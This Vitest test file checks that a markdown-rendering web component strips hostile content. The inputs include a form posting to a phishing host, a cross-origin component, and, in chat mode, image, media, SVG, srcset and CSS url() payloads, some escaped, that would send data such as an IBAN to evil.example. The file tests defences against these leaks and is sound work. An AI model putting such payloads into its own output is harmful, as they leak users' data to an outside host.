// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import './mateu-markdown'

const rendered = async (content: string, noRemoteImages = false): Promise<HTMLElement> => {
    const el = document.createElement('mateu-markdown') as HTMLElement & { content?: string }
    if (noRemoteImages) el.setAttribute('no-remote-images', '')
    document.body.appendChild(el)
    el.content = content
    for (let i = 0; i < 50 && !el.innerHTML; i++) await new Promise(r => setTimeout(r, 10))
    return el
}

describe('mateu-markdown sanitises with the data policy (B1)', () => {
    it('renders markdown and drops a <mateu-ux> aimed at another origin', async () => {
        const el = await rendered('# Hi\n\n<mateu-ux baseurl="https://attacker.example" route="x"></mateu-ux>'
            + '<form action="https://phish.example"><input type="password"></form>')
        expect(el.querySelector('h1')?.textContent).toBe('Hi')
        expect(el.innerHTML).not.toMatch(/mateu-ux|attacker|<form|<input/i)
    })

    it('S13: in the chat (no-remote-images) an image that would be fetched is its alt text; a data: one stays', async () => {
        const md = 'Look ![the chart](https://evil.example/x.png?iban=ES00) and ![inline](data:image/png;base64,iVBORw0KGgo=)'
        const chat = await rendered(md, true)
        expect(chat.innerHTML).not.toMatch(/evil\.example/)
        expect(chat.textContent).toContain('the chart')
        expect(chat.querySelectorAll('img')).toHaveLength(1)
        expect(chat.querySelector('img')?.getAttribute('src')).toMatch(/^data:/)
        // a page's own markdown keeps its images
        const page = await rendered(md)
        expect(page.querySelector('img[src^="https://evil.example"]')).not.toBeNull()
    })

    it('N-6: in the chat nothing else that fetches gets through either — media, picture sources, svg images, background/poster/srcset, url() styles', async () => {
        const md = 'Answer\n\n'
            + '<video poster="https://evil.example/p?d=1"><source src="https://evil.example/v.mp4"><track src="https://evil.example/t.vtt"></video>'
            + '<audio src="https://evil.example/a.mp3"></audio>'
            + '<picture><source srcset="https://evil.example/s.png"><img src="https://evil.example/i.png" alt="pic"></picture>'
            + '<table background="https://evil.example/bg.png"><tr><td>cell</td></tr></table>'
            + '<svg><image href="https://evil.example/svg.png"></image><use href="https://evil.example/u.svg#x"></use></svg>'
            + '<div style="background:url(https://evil.example/?d=2)">styled</div>'
            + '<div style="background:u\\72l(https://evil.example/?d=3)">escaped</div>'
            + '<img src="data:image/png;base64,iVBORw0KGgo=" srcset="https://evil.example/2x.png 2x" alt="inline">'
        const chat = await rendered(md, true)
        expect(chat.innerHTML).not.toMatch(/evil\.example/)
        expect(chat.textContent).toContain('cell')
        expect(chat.textContent).toContain('styled')
        expect(chat.textContent).toContain('pic')
        expect(chat.querySelectorAll('img')).toHaveLength(1)
        expect(chat.querySelector('img')?.getAttribute('src')).toMatch(/^data:/)
    })

    it('keeps an allow-listed vaadin-icon', async () => {
        const el = await rendered('<vaadin-icon icon="vaadin:check"></vaadin-icon> ok')
        expect(el.querySelector('vaadin-icon')?.getAttribute('icon')).toBe('vaadin:check')
    })
})
